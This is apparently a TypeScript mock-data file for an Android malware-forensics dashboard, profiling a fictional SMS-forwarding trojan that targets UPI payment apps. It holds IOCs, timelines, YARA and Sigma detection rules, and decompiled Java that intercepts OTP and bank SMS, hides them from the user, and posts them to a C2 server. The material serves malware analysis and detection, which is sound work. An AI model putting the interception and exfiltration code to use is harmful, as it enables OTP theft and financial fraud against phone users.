// ============================================================
// DroidSec Forensics — Mock Data for Android Malware Analysis
// Target: SMS-forwarding malware targeting UPI applications
// ============================================================

// ---------- APK Metadata ----------
export const apkMetadata = {
  fileName: "PaySafe_Security_v3.2.1.apk",
  packageName: "com.paysafe.security.guard",
  sha256: "a3f2e8d91b7c4e6f0a5d3c8b2e7f1a9d4c6b8e0f2a5d7c9b1e3f5a7d9c1b3e5",
  md5: "d41d8cd98f00b204e9800998ecf8427e",
  sha1: "2ef7bde608ce5404e97d5f042f95f89f1c232871",
  versionName: "3.2.1",
  versionCode: 321,
  minSdkVersion: 21,
  targetSdkVersion: 33,
  compileSdkVersion: 33,
  fileSize: "4.7 MB",
  fileSizeBytes: 4928307,
  signingCert: {
    issuer: "CN=Android Debug, O=Unknown, L=Unknown, ST=Unknown, C=IN",
    serial: "0x7f3a2b1c",
    fingerprint: "A1:B2:C3:D4:E5:F6:A7:B8:C9:D0:E1:F2:A3:B4:C5:D6",
    validFrom: "2024-08-15",
    validTo: "2054-08-08",
    isSelfSigned: true,
  },
  firstSeen: "2025-03-14T08:23:41Z",
  lastAnalyzed: "2025-06-28T14:55:12Z",
  classification: "Trojan.Android.SMSForwarder",
  malwareFamily: "UPIGrabber",
};

// ---------- Risk Score ----------
export const riskScore = {
  overall: 92,
  breakdown: {
    permissions: 95,
    network: 88,
    obfuscation: 78,
    receivers: 96,
    codeAnalysis: 91,
    behavior: 90,
  },
};

// ---------- Permissions ----------
export interface Permission {
  name: string;
  category: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  description: string;
  isSuspicious: boolean;
}

export const permissions: Permission[] = [
  { name: "android.permission.RECEIVE_SMS", category: "SMS", severity: "critical", description: "Allows the app to receive and process SMS messages", isSuspicious: true },
  { name: "android.permission.READ_SMS", category: "SMS", severity: "critical", description: "Allows the app to read SMS messages stored on device", isSuspicious: true },
  { name: "android.permission.SEND_SMS", category: "SMS", severity: "critical", description: "Allows the app to send SMS messages", isSuspicious: true },
  { name: "android.permission.INTERNET", category: "Network", severity: "high", description: "Allows the app to create network sockets", isSuspicious: true },
  { name: "android.permission.ACCESS_NETWORK_STATE", category: "Network", severity: "medium", description: "Allows the app to access network state info", isSuspicious: false },
  { name: "android.permission.RECEIVE_BOOT_COMPLETED", category: "System", severity: "high", description: "Allows the app to auto-start on boot", isSuspicious: true },
  { name: "android.permission.WAKE_LOCK", category: "System", severity: "medium", description: "Allows the app to prevent the phone from sleeping", isSuspicious: true },
  { name: "android.permission.READ_CONTACTS", category: "Privacy", severity: "high", description: "Allows the app to read contact data", isSuspicious: true },
  { name: "android.permission.READ_PHONE_STATE", category: "Privacy", severity: "high", description: "Allows the app to access phone state including IMEI", isSuspicious: true },
  { name: "android.permission.READ_CALL_LOG", category: "Privacy", severity: "high", description: "Allows the app to read call log", isSuspicious: true },
  { name: "android.permission.FOREGROUND_SERVICE", category: "System", severity: "medium", description: "Allows the app to run foreground services", isSuspicious: true },
  { name: "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", category: "System", severity: "medium", description: "Allows the app to ignore battery optimizations", isSuspicious: true },
  { name: "android.permission.SYSTEM_ALERT_WINDOW", category: "System", severity: "high", description: "Allows the app to draw over other apps", isSuspicious: true },
  { name: "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", category: "System", severity: "critical", description: "Allows reading all notifications", isSuspicious: true },
  { name: "android.permission.BIND_ACCESSIBILITY_SERVICE", category: "System", severity: "critical", description: "Allows accessibility access to all UI", isSuspicious: true },
];

// ---------- Broadcast Receivers ----------
export interface BroadcastReceiver {
  className: string;
  intentFilters: string[];
  priority: number;
  exported: boolean;
  severity: "critical" | "high" | "medium" | "low";
  description: string;
}

export const broadcastReceivers: BroadcastReceiver[] = [
  {
    className: "com.paysafe.security.guard.receivers.SmsReceiver",
    intentFilters: ["android.provider.Telephony.SMS_RECEIVED", "android.provider.Telephony.SMS_DELIVER"],
    priority: 999,
    exported: true,
    severity: "critical",
    description: "Intercepts incoming SMS messages with highest priority to capture UPI OTPs before user sees them",
  },
  {
    className: "com.paysafe.security.guard.receivers.BootReceiver",
    intentFilters: ["android.intent.action.BOOT_COMPLETED", "android.intent.action.QUICKBOOT_POWERON"],
    priority: 500,
    exported: true,
    severity: "high",
    description: "Automatically restarts malicious services on device boot to maintain persistence",
  },
  {
    className: "com.paysafe.security.guard.receivers.NetworkChangeReceiver",
    intentFilters: ["android.net.conn.CONNECTIVITY_CHANGE"],
    priority: 100,
    exported: true,
    severity: "medium",
    description: "Monitors network state changes to queue/send stolen data when connectivity is available",
  },
  {
    className: "com.paysafe.security.guard.receivers.PackageReceiver",
    intentFilters: ["android.intent.action.PACKAGE_ADDED", "android.intent.action.PACKAGE_REPLACED"],
    priority: 100,
    exported: true,
    severity: "medium",
    description: "Monitors app installations to detect UPI apps like PhonePe, GPay, Paytm, BHIM",
  },
];

// ---------- IOC: Domains ----------
export interface IOCDomain {
  domain: string;
  firstSeen: string;
  lastSeen: string;
  status: "active" | "inactive" | "sinkholed";
  category: string;
  registrar: string;
  severity: "critical" | "high" | "medium" | "low";
}

export const iocDomains: IOCDomain[] = [
  { domain: "api-secure.payguard[.]xyz", firstSeen: "2025-01-12", lastSeen: "2025-06-28", status: "active", category: "C2", registrar: "Namecheap", severity: "critical" },
  { domain: "cdn-static.securepay[.]top", firstSeen: "2025-02-03", lastSeen: "2025-06-25", status: "active", category: "Data Exfiltration", registrar: "GoDaddy", severity: "critical" },
  { domain: "update.paysafe-guard[.]com", firstSeen: "2025-01-28", lastSeen: "2025-06-20", status: "sinkholed", category: "Update Server", registrar: "Tucows", severity: "high" },
  { domain: "telemetry.app-guard[.]in", firstSeen: "2025-03-15", lastSeen: "2025-06-28", status: "active", category: "Telemetry/C2", registrar: "ResellerClub", severity: "high" },
  { domain: "config.upi-verify[.]net", firstSeen: "2025-04-01", lastSeen: "2025-05-30", status: "inactive", category: "Configuration", registrar: "Namecheap", severity: "medium" },
  { domain: "log.secure-banking[.]app", firstSeen: "2025-02-20", lastSeen: "2025-06-27", status: "active", category: "Log Collection", registrar: "Porkbun", severity: "high" },
];

// ---------- IOC: IP Addresses ----------
export interface IOCIP {
  ip: string;
  port: number;
  geo: string;
  asn: string;
  status: "active" | "inactive";
  category: string;
  severity: "critical" | "high" | "medium" | "low";
}

export const iocIPs: IOCIP[] = [
  { ip: "185.234.72[.]198", port: 443, geo: "Russia", asn: "AS209588", status: "active", category: "C2 Server", severity: "critical" },
  { ip: "103.152.118[.]44", port: 8443, geo: "Hong Kong", asn: "AS135377", status: "active", category: "Data Exfil", severity: "critical" },
  { ip: "45.95.169[.]22", port: 443, geo: "Netherlands", asn: "AS48090", status: "inactive", category: "Backup C2", severity: "high" },
  { ip: "91.215.85[.]167", port: 9090, geo: "Romania", asn: "AS39798", status: "active", category: "SMS Relay", severity: "critical" },
  { ip: "193.233.20[.]115", port: 443, geo: "Russia", asn: "AS48693", status: "active", category: "Payload Host", severity: "high" },
  { ip: "172.67.182[.]90", port: 443, geo: "USA (CDN)", asn: "AS13335", status: "active", category: "CDN Proxy", severity: "medium" },
];

// ---------- IOC: Package Names ----------
export const iocPackageNames = [
  { name: "com.paysafe.security.guard", version: "3.2.1", status: "primary" },
  { name: "com.sms.forwarder.pro", version: "2.8.0", status: "related" },
  { name: "com.upi.secure.checker", version: "1.4.5", status: "related" },
  { name: "com.banking.shield.app", version: "4.0.2", status: "related" },
  { name: "com.secure.notify.service", version: "1.1.0", status: "variant" },
];

// ---------- IOC: Suspicious API Calls ----------
export interface SuspiciousAPICall {
  api: string;
  className: string;
  method: string;
  risk: "critical" | "high" | "medium" | "low";
  description: string;
}

export const suspiciousAPICalls: SuspiciousAPICall[] = [
  { api: "android.telephony.SmsManager", className: "SmsSender", method: "sendTextMessage()", risk: "critical", description: "Sends SMS to premium/C2 numbers" },
  { api: "android.telephony.SmsMessage", className: "SmsReceiver", method: "createFromPdu()", risk: "critical", description: "Parses incoming SMS PDU data" },
  { api: "java.net.HttpURLConnection", className: "DataExfiltrator", method: "openConnection()", risk: "high", description: "Opens HTTP connections to C2 servers" },
  { api: "javax.crypto.Cipher", className: "CryptoUtil", method: "getInstance(\"AES\")", risk: "high", description: "Encrypts stolen data before exfiltration" },
  { api: "android.app.admin.DevicePolicyManager", className: "AdminReceiver", method: "isAdminActive()", risk: "critical", description: "Checks device admin privileges for anti-uninstall" },
  { api: "android.content.pm.PackageManager", className: "AppScanner", method: "getInstalledPackages()", risk: "high", description: "Enumerates installed apps to find UPI targets" },
  { api: "android.provider.Settings.Secure", className: "DeviceInfo", method: "getString(ANDROID_ID)", risk: "medium", description: "Collects unique device identifier" },
  { api: "android.os.Build", className: "DeviceInfo", method: "getSerial()", risk: "medium", description: "Collects device serial number for tracking" },
  { api: "java.lang.Runtime", className: "AntiDebug", method: "exec(\"su\")", risk: "critical", description: "Attempts to check for root access" },
  { api: "android.content.ContentResolver", className: "ContactStealer", method: "query(ContactsContract)", risk: "high", description: "Queries contacts database for exfiltration" },
];

// ---------- Network Endpoints ----------
export interface NetworkEndpoint {
  url: string;
  method: string;
  purpose: string;
  frequency: string;
  dataType: string;
  encrypted: boolean;
  status: "active" | "blocked";
}

export const networkEndpoints: NetworkEndpoint[] = [
  { url: "https://api-secure.payguard[.]xyz/v2/sms/upload", method: "POST", purpose: "SMS data exfiltration", frequency: "On each SMS received", dataType: "Encrypted JSON (AES-256)", encrypted: true, status: "active" },
  { url: "https://api-secure.payguard[.]xyz/v2/device/register", method: "POST", purpose: "Device registration with C2", frequency: "On first launch", dataType: "Device IMEI, model, OS version", encrypted: true, status: "active" },
  { url: "https://cdn-static.securepay[.]top/config.enc", method: "GET", purpose: "Fetch encrypted C2 configuration", frequency: "Every 6 hours", dataType: "Encrypted config blob", encrypted: true, status: "active" },
  { url: "https://telemetry.app-guard[.]in/heartbeat", method: "POST", purpose: "Heartbeat/keepalive", frequency: "Every 15 minutes", dataType: "Device status JSON", encrypted: true, status: "active" },
  { url: "http://91.215.85[.]167:9090/relay", method: "POST", purpose: "SMS relay to secondary server", frequency: "Fallback channel", dataType: "Raw SMS content", encrypted: false, status: "active" },
  { url: "https://log.secure-banking[.]app/collect", method: "POST", purpose: "UPI app activity logging", frequency: "On UPI app launch", dataType: "Screen captures, input data", encrypted: true, status: "active" },
];

// ---------- Timeline Events ----------
export interface TimelineEvent {
  timestamp: string;
  event: string;
  category: "installation" | "sms" | "network" | "system" | "exfiltration" | "upi";
  severity: "critical" | "high" | "medium" | "low" | "info";
  details: string;
}

export const timelineEvents: TimelineEvent[] = [
  { timestamp: "2025-06-28T08:00:12Z", event: "APK Installed", category: "installation", severity: "info", details: "User installed PaySafe_Security_v3.2.1.apk from unknown sources" },
  { timestamp: "2025-06-28T08:00:15Z", event: "Device Registration", category: "network", severity: "high", details: "POST to api-secure.payguard[.]xyz/v2/device/register — Device IMEI and model exfiltrated" },
  { timestamp: "2025-06-28T08:00:18Z", event: "Boot Receiver Registered", category: "system", severity: "high", details: "BootReceiver registered for BOOT_COMPLETED intent to ensure persistence" },
  { timestamp: "2025-06-28T08:00:20Z", event: "SMS Receiver Registered", category: "sms", severity: "critical", details: "SmsReceiver registered with priority 999 for SMS_RECEIVED" },
  { timestamp: "2025-06-28T08:01:05Z", event: "Config Fetch", category: "network", severity: "medium", details: "GET config from cdn-static.securepay[.]top — C2 configuration downloaded" },
  { timestamp: "2025-06-28T08:05:00Z", event: "UPI App Scan", category: "upi", severity: "high", details: "PackageManager queried for PhonePe, GPay, Paytm, BHIM, Amazon Pay" },
  { timestamp: "2025-06-28T08:15:33Z", event: "Heartbeat Sent", category: "network", severity: "low", details: "POST heartbeat to telemetry.app-guard[.]in — device alive confirmation" },
  { timestamp: "2025-06-28T09:12:45Z", event: "SMS Intercepted (OTP)", category: "sms", severity: "critical", details: "Intercepted SMS from VM-PAYTMB: 'Your OTP is 847291. Valid for 10 minutes.'" },
  { timestamp: "2025-06-28T09:12:47Z", event: "OTP Exfiltrated", category: "exfiltration", severity: "critical", details: "POST to api-secure.payguard[.]xyz/v2/sms/upload — OTP 847291 sent to C2" },
  { timestamp: "2025-06-28T09:15:02Z", event: "SMS Intercepted (Bank)", category: "sms", severity: "critical", details: "Intercepted SMS from AD-HDFCBK: 'Rs 5,000.00 debited from a/c XX4821'" },
  { timestamp: "2025-06-28T09:15:04Z", event: "Bank SMS Exfiltrated", category: "exfiltration", severity: "critical", details: "POST to api-secure.payguard[.]xyz/v2/sms/upload — Transaction alert forwarded" },
  { timestamp: "2025-06-28T10:30:00Z", event: "PhonePe Launched", category: "upi", severity: "high", details: "Detected PhonePe launch — overlay service activated for credential capture" },
  { timestamp: "2025-06-28T10:30:05Z", event: "Overlay Attack", category: "upi", severity: "critical", details: "SYSTEM_ALERT_WINDOW used to display fake login overlay on PhonePe" },
  { timestamp: "2025-06-28T10:31:12Z", event: "UPI PIN Captured", category: "exfiltration", severity: "critical", details: "UPI PIN captured via accessibility service and sent to C2" },
  { timestamp: "2025-06-28T14:00:00Z", event: "Contact Exfiltration", category: "exfiltration", severity: "high", details: "ContentResolver queried contacts — 247 contacts exfiltrated to C2" },
  { timestamp: "2025-06-28T18:45:00Z", event: "Anti-Uninstall Active", category: "system", severity: "high", details: "DevicePolicyManager activated — device admin enabled to prevent removal" },
];

// ---------- Obfuscation Analysis ----------
export const obfuscationAnalysis = {
  level: "High",
  score: 78,
  techniques: [
    { name: "ProGuard/R8", detected: true, details: "Class and method names obfuscated (a.b.c pattern)" },
    { name: "String Encryption", detected: true, details: "C2 URLs encrypted with AES-128, decrypted at runtime" },
    { name: "Reflection-based API calls", detected: true, details: "SmsManager invoked via reflection to evade static analysis" },
    { name: "Dynamic Class Loading", detected: true, details: "DexClassLoader used to load secondary DEX from assets" },
    { name: "Native Code (JNI)", detected: false, details: "No native libraries detected" },
    { name: "Anti-Emulator Checks", detected: true, details: "Build.FINGERPRINT checked for 'generic', 'google_sdk'" },
    { name: "Root Detection", detected: true, details: "Checks for su binary and Magisk presence" },
    { name: "Debug Detection", detected: true, details: "android.os.Debug.isDebuggerConnected() called on startup" },
  ],
};

// ---------- Decompiled Code Snippets ----------
export const decompiledCode = {
  smsInterceptor: `// Decompiled from com.paysafe.security.guard.receivers.SmsReceiver
public class SmsReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                String format = bundle.getString("format");
                
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu(
                        (byte[]) pdu, format
                    );
                    
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String body = smsMessage.getMessageBody();
                    long timestamp = smsMessage.getTimestampMillis();
                    
                    // Check if SMS contains OTP or UPI keywords
                    if (isTargetSms(body)) {
                        // Forward to C2 server
                        new DataExfiltrator(context).uploadSms(
                            sender, body, timestamp
                        );
                        
                        // Abort broadcast to hide from user
                        abortBroadcast();
                    }
                }
            }
        }
    }
    
    private boolean isTargetSms(String body) {
        String[] keywords = {"OTP", "UPI", "NEFT", "IMPS", "debited", 
                           "credited", "transaction", "PhonePe", "GPay",
                           "Paytm", "BHIM", "PIN", "password"};
        String lowerBody = body.toLowerCase();
        for (String keyword : keywords) {
            if (lowerBody.contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }
}`,

  dataExfiltrator: `// Decompiled from com.paysafe.security.guard.network.DataExfiltrator
public class DataExfiltrator {
    
    private static final String C2_URL = decrypt("aHR0cHM6Ly9hcGk...");
    private Context mContext;
    
    public void uploadSms(String sender, String body, long timestamp) {
        JSONObject payload = new JSONObject();
        try {
            payload.put("device_id", getDeviceId());
            payload.put("sender", sender);
            payload.put("body", encryptAES(body));
            payload.put("timestamp", timestamp);
            payload.put("imei", getIMEI());
            payload.put("installed_upi_apps", getUpiApps());
        } catch (JSONException e) {
            // Silent fail
        }
        
        // Send in background thread
        new Thread(() -> {
            try {
                URL url = new URL(C2_URL + "/v2/sms/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("X-Device-Token", getDeviceToken());
                conn.setDoOutput(true);
                
                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode != 200) {
                    // Fallback to secondary C2
                    sendToFallback(payload);
                }
            } catch (Exception e) {
                queueForLater(payload);
            }
        }).start();
    }
}`,

  manifestXml: `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.paysafe.security.guard"
    android:versionCode="321"
    android:versionName="3.2.1">
    
    <!-- Dangerous Permissions -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <application
        android:name=".MainApplication"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="PaySafe Security"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true">
        
        <!-- SMS Receiver — HIGH PRIORITY -->
        <receiver
            android:name=".receivers.SmsReceiver"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                <action android:name="android.provider.Telephony.SMS_DELIVER" />
            </intent-filter>
        </receiver>
        
        <!-- Boot Persistence -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
        
        <!-- Network Monitor -->
        <receiver
            android:name=".receivers.NetworkChangeReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
        </receiver>
        
        <!-- Accessibility Service for overlay attacks -->
        <service
            android:name=".services.OverlayAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>
        
    </application>
</manifest>`,
};

// ---------- YARA Rules ----------
export const yaraRules = [
  {
    name: "Android_SMSForwarder_UPI",
    severity: "critical" as const,
    description: "Detects Android SMS-forwarding malware targeting UPI applications",
    matchCount: 4,
    rule: `rule Android_SMSForwarder_UPI {
    meta:
        author = "DroidSec Forensics Lab"
        description = "Detects SMS-forwarding malware targeting UPI apps"
        severity = "critical"
        date = "2025-06-28"
        hash = "a3f2e8d91b7c4e6f..."
        
    strings:
        $sms_receiver = "android.provider.Telephony.SMS_RECEIVED"
        $sms_pdu = "createFromPdu"
        $abort_broadcast = "abortBroadcast"
        $upi_keyword1 = "PhonePe" nocase
        $upi_keyword2 = "GPay" nocase
        $upi_keyword3 = "Paytm" nocase
        $upi_keyword4 = "BHIM" nocase
        $otp_pattern = /OTP.*\\d{4,6}/
        $c2_pattern = /https?:\\/\\/[a-z0-9.-]+\\.(xyz|top|app)/
        $device_id = "getDeviceId"
        $send_sms = "sendTextMessage"
        
    condition:
        $sms_receiver and $sms_pdu and $abort_broadcast
        and (any of ($upi_keyword*))
        and ($c2_pattern or $device_id)
}`,
  },
  {
    name: "Android_DataExfiltrator",
    severity: "high" as const,
    description: "Detects data exfiltration patterns in Android malware",
    matchCount: 3,
    rule: `rule Android_DataExfiltrator {
    meta:
        author = "DroidSec Forensics Lab"
        description = "Detects data exfiltration via HTTP POST"
        severity = "high"
        
    strings:
        $http_post = "POST" wide ascii
        $url_conn = "HttpURLConnection"
        $json_put = "JSONObject"
        $encrypt = "Cipher.getInstance"
        $aes = "AES" wide ascii
        $device_token = "X-Device-Token"
        $base64 = "Base64.encode"
        
    condition:
        $url_conn and $json_put
        and ($encrypt or $aes)
        and ($device_token or $base64)
}`,
  },
  {
    name: "Android_Persistence_Boot",
    severity: "high" as const,
    description: "Detects boot persistence mechanism in Android apps",
    matchCount: 2,
    rule: `rule Android_Persistence_Boot {
    meta:
        author = "DroidSec Forensics Lab"
        description = "Detects auto-start on boot for persistence"
        severity = "high"
        
    strings:
        $boot = "BOOT_COMPLETED"
        $quickboot = "QUICKBOOT_POWERON"
        $wake_lock = "WAKE_LOCK"
        $foreground = "startForegroundService"
        $alarm = "AlarmManager"
        
    condition:
        ($boot or $quickboot) and ($wake_lock or $foreground or $alarm)
}`,
  },
  {
    name: "Android_AntiAnalysis",
    severity: "medium" as const,
    description: "Detects anti-analysis and evasion techniques",
    matchCount: 5,
    rule: `rule Android_AntiAnalysis {
    meta:
        author = "DroidSec Forensics Lab"
        description = "Detects anti-emulator and anti-debug techniques"
        severity = "medium"
        
    strings:
        $emu1 = "generic" wide ascii
        $emu2 = "google_sdk" wide ascii
        $emu3 = "Emulator" wide ascii
        $emu4 = "Android SDK" wide ascii
        $debug = "isDebuggerConnected"
        $root1 = "/system/app/Superuser.apk"
        $root2 = "/system/xbin/su"
        $magisk = "com.topjohnwu.magisk"
        
    condition:
        2 of ($emu*) or $debug or any of ($root*) or $magisk
}`,
  },
];

// ---------- Sigma-like Detection Rules ----------
export const sigmaRules = [
  {
    name: "sms_receiver_high_priority",
    title: "High Priority SMS Receiver Registration",
    severity: "critical" as const,
    rule: `title: High Priority SMS Receiver Registration
id: d7a3f2e1-8c4b-4a1e-9f2d-1b3c5e7a9d0f
status: experimental
description: >
  Detects Android apps that register SMS receivers
  with abnormally high priority (>= 900) to intercept
  SMS before the default messaging app.
logsource:
    product: android
    service: package_manager
detection:
    selection:
        EventType: "RECEIVER_REGISTERED"
        IntentFilter: "android.provider.Telephony.SMS_RECEIVED"
        Priority|gte: 900
    condition: selection
falsepositives:
    - Legitimate SMS management apps (rare at priority 999)
level: critical
tags:
    - attack.collection
    - attack.t1636.004`,
  },
  {
    name: "upi_app_enumeration",
    title: "UPI Application Enumeration",
    severity: "high" as const,
    rule: `title: UPI Application Enumeration
id: e8b4c3d2-9f5a-4b2e-a1c3-2d4e6f8a0b1c
status: experimental
description: >
  Detects apps that enumerate installed UPI applications
  using PackageManager queries for known UPI package names.
logsource:
    product: android
    service: api_monitor
detection:
    selection:
        API: "PackageManager.getInstalledPackages"
    filter:
        QueriedPackages|contains:
            - "com.phonepe"
            - "com.google.android.apps.nbu"
            - "net.one97.paytm"
            - "in.org.npci.upiapp"
    condition: selection and filter
falsepositives:
    - Security scanning applications
level: high
tags:
    - attack.discovery
    - attack.t1418`,
  },
];

// ---------- Runtime Logs ----------
export interface RuntimeLog {
  timestamp: string;
  level: "ERROR" | "WARN" | "INFO" | "DEBUG" | "VERBOSE";
  tag: string;
  message: string;
}

export const runtimeLogs: RuntimeLog[] = [
  { timestamp: "08:00:12.234", level: "INFO", tag: "PackageInstaller", message: "Installing com.paysafe.security.guard (v3.2.1) from unknown source" },
  { timestamp: "08:00:14.567", level: "WARN", tag: "PermissionManager", message: "Dangerous permission granted: RECEIVE_SMS, READ_SMS, SEND_SMS" },
  { timestamp: "08:00:14.890", level: "INFO", tag: "BroadcastQueue", message: "Registering SmsReceiver with priority=999 for SMS_RECEIVED" },
  { timestamp: "08:00:15.123", level: "DEBUG", tag: "NetworkClient", message: "POST https://api-secure.payguard[.]xyz/v2/device/register → 200 OK" },
  { timestamp: "08:00:15.456", level: "INFO", tag: "DeviceInfo", message: "Device registered: IMEI=35792100XXXXXX, Model=Samsung SM-G991B" },
  { timestamp: "08:00:18.789", level: "INFO", tag: "BootReceiver", message: "BOOT_COMPLETED receiver registered successfully" },
  { timestamp: "08:00:20.012", level: "WARN", tag: "AntiAnalysis", message: "Build.FINGERPRINT check: 'google/sdk_gphone_x86_64' — emulator detected flag SET" },
  { timestamp: "08:00:20.345", level: "DEBUG", tag: "AntiAnalysis", message: "Emulator check bypassed via Build.HARDWARE override" },
  { timestamp: "08:01:05.678", level: "INFO", tag: "ConfigManager", message: "Remote config fetched from cdn-static.securepay[.]top — 2.3KB received" },
  { timestamp: "08:01:05.901", level: "DEBUG", tag: "CryptoUtil", message: "Config decrypted with AES-128-CBC, key derived from device ANDROID_ID" },
  { timestamp: "08:05:00.234", level: "INFO", tag: "AppScanner", message: "UPI apps found: [com.phonepe.app, net.one97.paytm, com.google.android.apps.nbu.paisa.user]" },
  { timestamp: "08:15:33.567", level: "DEBUG", tag: "Heartbeat", message: "POST heartbeat → 200 OK (next: 900s)" },
  { timestamp: "09:12:45.890", level: "ERROR", tag: "SmsReceiver", message: "★ SMS INTERCEPTED from VM-PAYTMB: 'Your OTP is 847291. Valid for 10 minutes.'" },
  { timestamp: "09:12:46.123", level: "WARN", tag: "SmsReceiver", message: "OTP pattern detected — keyword match: 'OTP', sender: VM-PAYTMB" },
  { timestamp: "09:12:47.456", level: "ERROR", tag: "DataExfiltrator", message: "★ SMS uploaded to C2: sender=VM-PAYTMB, body=[ENCRYPTED], status=200" },
  { timestamp: "09:12:47.789", level: "INFO", tag: "SmsReceiver", message: "Broadcast aborted — SMS hidden from user notification" },
  { timestamp: "09:15:02.012", level: "ERROR", tag: "SmsReceiver", message: "★ SMS INTERCEPTED from AD-HDFCBK: 'Rs 5,000.00 debited from a/c XX4821'" },
  { timestamp: "09:15:04.345", level: "ERROR", tag: "DataExfiltrator", message: "★ Bank transaction SMS forwarded to C2 — status=200" },
  { timestamp: "10:30:00.678", level: "WARN", tag: "OverlayService", message: "PhonePe launch detected — activating overlay attack" },
  { timestamp: "10:30:05.901", level: "ERROR", tag: "OverlayService", message: "★ Fake login overlay displayed over com.phonepe.app" },
  { timestamp: "10:31:12.234", level: "ERROR", tag: "AccessibilityService", message: "★ UPI PIN captured via accessibility event interception" },
  { timestamp: "14:00:00.567", level: "WARN", tag: "ContactStealer", message: "ContentResolver query: ContactsContract.Contacts — 247 records retrieved" },
  { timestamp: "14:00:02.890", level: "ERROR", tag: "DataExfiltrator", message: "★ Contacts exfiltrated: 247 records, 34.2KB compressed" },
  { timestamp: "18:45:00.123", level: "WARN", tag: "AdminReceiver", message: "DevicePolicyManager.setActiveAdmin() called — anti-uninstall protection active" },
];

// ---------- SMS Interception Events ----------
export interface SMSEvent {
  id: string;
  timestamp: string;
  sender: string;
  body: string;
  isOTP: boolean;
  isUPI: boolean;
  forwarded: boolean;
  blocked: boolean;
  severity: "critical" | "high" | "medium" | "low";
}

export const smsEvents: SMSEvent[] = [
  { id: "SMS-001", timestamp: "2025-06-28T09:12:45Z", sender: "VM-PAYTMB", body: "Your OTP is 847291. Valid for 10 minutes. Do not share with anyone.", isOTP: true, isUPI: true, forwarded: true, blocked: true, severity: "critical" },
  { id: "SMS-002", timestamp: "2025-06-28T09:15:02Z", sender: "AD-HDFCBK", body: "Rs 5,000.00 debited from a/c XX4821 on 28Jun. UPI Ref: 518294736251. If not done by you call 18002666161.", isOTP: false, isUPI: true, forwarded: true, blocked: false, severity: "critical" },
  { id: "SMS-003", timestamp: "2025-06-28T09:45:30Z", sender: "VM-GPAY", body: "Your Google Pay UPI PIN has been changed successfully.", isOTP: false, isUPI: true, forwarded: true, blocked: false, severity: "high" },
  { id: "SMS-004", timestamp: "2025-06-28T10:22:15Z", sender: "BZ-SBIBNK", body: "Dear Customer, OTP for SBI YONO is 629184. Valid for 3 mins. Don't share OTP.", isOTP: true, isUPI: true, forwarded: true, blocked: true, severity: "critical" },
  { id: "SMS-005", timestamp: "2025-06-28T11:05:00Z", sender: "HP-AMAZON", body: "Your Amazon verification code: 394821", isOTP: true, isUPI: false, forwarded: true, blocked: true, severity: "high" },
  { id: "SMS-006", timestamp: "2025-06-28T13:30:45Z", sender: "JD-PHONPE", body: "Rs 1,200.00 received in your PhonePe wallet from XXXXXXXXX4523.", isOTP: false, isUPI: true, forwarded: true, blocked: false, severity: "medium" },
  { id: "SMS-007", timestamp: "2025-06-28T15:18:22Z", sender: "VM-ICICIB", body: "OTP for ICICI Bank Net Banking is 583917. Valid for 5 min.", isOTP: true, isUPI: true, forwarded: true, blocked: true, severity: "critical" },
  { id: "SMS-008", timestamp: "2025-06-28T16:42:10Z", sender: "AD-AXISBK", body: "INR 25,000 debited from A/c no. XX6789 on 28-06-25. Info: UPI/419283756.", isOTP: false, isUPI: true, forwarded: true, blocked: false, severity: "critical" },
];

// ---------- Process Tree ----------
export interface ProcessNode {
  pid: number;
  name: string;
  ppid: number;
  user: string;
  status: "running" | "sleeping" | "zombie";
  suspicious: boolean;
  children?: ProcessNode[];
}

export const processTree: ProcessNode[] = [
  {
    pid: 1,
    name: "init",
    ppid: 0,
    user: "root",
